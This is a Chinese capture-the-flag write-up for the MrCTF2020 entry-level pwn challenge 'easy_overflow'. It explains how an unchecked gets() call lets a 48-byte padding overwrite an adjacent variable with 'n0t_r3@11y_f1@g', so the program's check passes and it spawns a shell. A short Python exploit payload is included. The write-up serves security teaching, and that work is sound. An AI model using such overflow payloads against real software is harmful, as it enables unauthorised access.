
## easy_overflow
- 题目描述：
    
    > 有种你连我
- 题目附件：[easy_overflow](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/easy_overflow/easy_overflow)
- 考察点：栈溢出、变量覆盖
- 难度：入门
- 初始分值：500
- 最终分值：50
- 完成人数：58

### 程序分析

主要代码如下，`gets`函数存在漏洞，可导致栈溢出：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-70h]
  char v5; // [rsp+30h] [rbp-40h]
  // ...
  gets(&v4, argv);
  if ( !check(&v5) )
    exit(0);
  system("/bin/sh");
  return 0;
}
```

程序逻辑比较简单：对`v5`进行检查，通过检查就给shell。

```nasm
 ► 0x555555554874 <main+113>    call   check <0x55555555479a>
        rdi: 0x7fffffffda80 ◂— 'ju3t_@_f@k3_f1@g'
```

> `v5="ju3t_@_f@k3_f1@g"`

`check`函数如下：

```c
signed __int64 __fastcall check(__int64 a1){
  int i; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(fake_flag);
  for ( i = 0; ; ++i )
  {
    if ( i == v3 )
      return 1LL;
    if ( *(i + a1) != fake_flag[i] )
      break;
  }
  return 0LL;
}
```

> 其中`fake_flag`位于`.data`段， `fake_flag = "n0t_r3@11y_f1@g"`

### 解题思路

`gets(&v4)`存在溢出，将`v4`后的`v5`覆盖为`n0t_r3@11y_f1@g`即可通过`check`

### exp
```python
offset = 48
payload = 'A'*offset
payload += 'n0t_r3@11y_f1@g'
sl(payload)
```

